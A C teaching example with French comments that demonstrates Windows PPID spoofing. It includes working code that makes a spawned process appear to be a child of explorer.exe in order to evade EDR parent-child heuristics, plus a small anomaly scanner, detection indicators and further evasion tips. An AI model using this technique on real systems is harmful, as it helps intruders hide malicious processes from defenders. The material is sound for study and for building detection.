/*
 * OBJECTIF  : Falsifier le Parent Process ID pour masquer l'origine d'un processus
 * PREREQUIS : CreateProcess, STARTUPINFOEX, listes d'attributs
 * COMPILE   : cl example.c /Fe:example.exe
 *
 * Quand un processus en cree un autre, Windows enregistre le PID parent.
 * Les EDR/SIEM analysent les relations parent-enfant pour detecter les anomalies :
 * - cmd.exe lance par excel.exe = suspect
 * - powershell.exe lance par svchost.exe = suspect
 *
 * Le PPID Spoofing permet de falsifier cette relation en utilisant
 * PROC_THREAD_ATTRIBUTE_PARENT_PROCESS dans CreateProcess.
 * Le nouveau processus apparait comme enfant d'un processus legitime.
 */

#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

/* Trouver un PID par nom de processus */
DWORD find_pid_by_name(const char* proc_name) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(pe);

    DWORD pid = 0;
    if (Process32First(snap, &pe)) {
        do {
            if (_stricmp(pe.szExeFile, proc_name) == 0) {
                pid = pe.th32ProcessID;
                break;
            }
        } while (Process32Next(snap, &pe));
    }

    CloseHandle(snap);
    return pid;
}

/* Afficher les infos parent-enfant d'un processus */
void print_process_tree(DWORD pid) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return;

    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(pe);

    if (Process32First(snap, &pe)) {
        do {
            if (pe.th32ProcessID == pid) {
                printf("        PID: %lu  Name: %s  Parent PID: %lu\n",
                       pe.th32ProcessID, pe.szExeFile, pe.th32ParentProcessID);
                break;
            }
        } while (Process32Next(snap, &pe));
    }

    CloseHandle(snap);
}

/* Demo 1 : Afficher la relation parent-enfant normale */
void demo_normal_parent(void) {
    printf("[1] Relation parent-enfant normale\n\n");

    DWORD my_pid = GetCurrentProcessId();
    printf("    [+] Notre processus :\n");
    print_process_tree(my_pid);
    printf("\n");

    /* Creer un processus normalement */
    STARTUPINFOA si = {0};
    si.cb = sizeof(si);
    PROCESS_INFORMATION pi = {0};

    if (CreateProcessA(NULL, "cmd.exe /c echo test", NULL, NULL, FALSE,
                        CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        printf("    [+] Processus enfant cree normalement :\n");
        print_process_tree(pi.dwProcessId);
        printf("    [*] Le parent est notre PID (%lu) = normal\n\n", my_pid);

        WaitForSingleObject(pi.hProcess, 3000);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
}

/* Demo 2 : PPID Spoofing via PROC_THREAD_ATTRIBUTE_PARENT_PROCESS */
void demo_ppid_spoofing(void) {
    printf("[2] PPID Spoofing via STARTUPINFOEX\n\n");

    /* Trouver explorer.exe comme faux parent */
    DWORD target_ppid = find_pid_by_name("explorer.exe");
    if (target_ppid == 0) {
        printf("    [-] explorer.exe non trouve\n");
        return;
    }
    printf("    [+] Faux parent : explorer.exe (PID %lu)\n", target_ppid);

    /* Ouvrir un handle sur le processus parent souhaite */
    HANDLE hParent = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, target_ppid);
    if (!hParent) {
        printf("    [-] OpenProcess echoue (err %lu)\n", GetLastError());
        printf("    [*] Necessite PROCESS_CREATE_PROCESS sur le processus cible\n");
        return;
    }
    printf("    [+] Handle parent : %p\n", hParent);

    /* Initialiser la liste d'attributs */
    SIZE_T attr_size = 0;
    InitializeProcThreadAttributeList(NULL, 1, 0, &attr_size);

    LPPROC_THREAD_ATTRIBUTE_LIST attr_list =
        (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(),
                                                 HEAP_ZERO_MEMORY, attr_size);
    if (!attr_list) {
        CloseHandle(hParent);
        return;
    }

    InitializeProcThreadAttributeList(attr_list, 1, 0, &attr_size);

    /* Definir le faux parent */
    UpdateProcThreadAttribute(attr_list, 0,
                               PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
                               &hParent, sizeof(HANDLE), NULL, NULL);

    /* Creer le processus avec STARTUPINFOEX */
    STARTUPINFOEXA si = {0};
    si.StartupInfo.cb = sizeof(STARTUPINFOEXA);
    si.lpAttributeList = attr_list;

    PROCESS_INFORMATION pi = {0};

    printf("    [+] Creation de cmd.exe avec faux parent...\n");

    if (CreateProcessA(NULL, "cmd.exe /c echo PPID_Spoofed",
                        NULL, NULL, FALSE,
                        EXTENDED_STARTUPINFO_PRESENT | CREATE_NO_WINDOW,
                        NULL, NULL,
                        (LPSTARTUPINFOA)&si, &pi)) {

        printf("    [+] Processus spoofed cree :\n");
        print_process_tree(pi.dwProcessId);
        printf("    [+] Le parent affiche est explorer.exe (%lu), pas nous!\n\n", target_ppid);

        WaitForSingleObject(pi.hProcess, 3000);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    } else {
        printf("    [-] CreateProcess echoue (err %lu)\n", GetLastError());
    }

    DeleteProcThreadAttributeList(attr_list);
    HeapFree(GetProcessHeap(), 0, attr_list);
    CloseHandle(hParent);
}

/* Demo 3 : Scanner les anomalies parent-enfant */
void demo_anomaly_scanner(void) {
    printf("[3] Scanner d'anomalies parent-enfant\n\n");

    /* Regles heuristiques courantes des EDR */
    typedef struct {
        const char* child;
        const char* expected_parent;
    } PARENT_RULE;

    PARENT_RULE rules[] = {
        {"svchost.exe",    "services.exe"},
        {"lsass.exe",      "wininit.exe"},
        {"csrss.exe",      "smss.exe"},
        {"smss.exe",       "System"},
        {"wininit.exe",    "smss.exe"},
        {"winlogon.exe",   "smss.exe"},
        {"taskhostw.exe",  "svchost.exe"},
        {NULL, NULL}
    };

    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return;

    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(pe);

    printf("    Regles parent-enfant attendues :\n\n");

    if (Process32First(snap, &pe)) {
        do {
            for (int r = 0; rules[r].child; r++) {
                if (_stricmp(pe.szExeFile, rules[r].child) == 0) {
                    /* Trouver le nom du parent reel */
                    HANDLE snap2 = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
                    PROCESSENTRY32 pe2;
                    pe2.dwSize = sizeof(pe2);
                    char parent_name[MAX_PATH] = "???";

                    if (Process32First(snap2, &pe2)) {
                        do {
                            if (pe2.th32ProcessID == pe.th32ParentProcessID) {
                                strncpy_s(parent_name, MAX_PATH, pe2.szExeFile, _TRUNCATE);
                                break;
                            }
                        } while (Process32Next(snap2, &pe2));
                    }
                    CloseHandle(snap2);

                    BOOL ok = (_stricmp(parent_name, rules[r].expected_parent) == 0);
                    printf("    %s (PID %lu) -> parent: %s %s\n",
                           pe.szExeFile, pe.th32ProcessID, parent_name,
                           ok ? "[OK]" : "[ANOMALIE!]");
                    printf("        Attendu: %s\n", rules[r].expected_parent);
                }
            }
        } while (Process32Next(snap, &pe));
    }

    CloseHandle(snap);
    printf("\n");
}

/* Demo 4 : Techniques de detection */
void demo_detection(void) {
    printf("[4] Detection du PPID Spoofing\n\n");

    printf("    Indicateurs :\n");
    printf("    - ETW : EtwTi event pour la creation de processus\n");
    printf("      contient le VRAI parent (CreatingProcessId)\n");
    printf("    - Sysmon Event ID 1 : ParentProcessId vs CreatorProcessId\n");
    printf("    - Kernel callback PsSetCreateProcessNotifyRoutineEx\n");
    printf("      recoit le vrai parent dans PS_CREATE_NOTIFY_INFO\n\n");

    printf("    Contournements avances :\n");
    printf("    - Combiner PPID Spoofing + Command Line Spoofing\n");
    printf("    - Utiliser un parent coherent (ex: svchost pour un service)\n");
    printf("    - Creer le processus suspendu pour modifier le PEB\n\n");

    printf("    [*] Le PPID dans le PEB peut etre modifie, mais les callbacks\n");
    printf("    [*] kernel voient le vrai parent a la creation.\n\n");
}

int main(void) {
    printf("[*] Demo : PPID Spoofing - Falsification du processus parent\n");
    printf("[*] ==========================================\n\n");

    demo_normal_parent();
    demo_ppid_spoofing();
    demo_anomaly_scanner();
    demo_detection();

    printf("[+] Exemple termine avec succes\n");
    return 0;
}
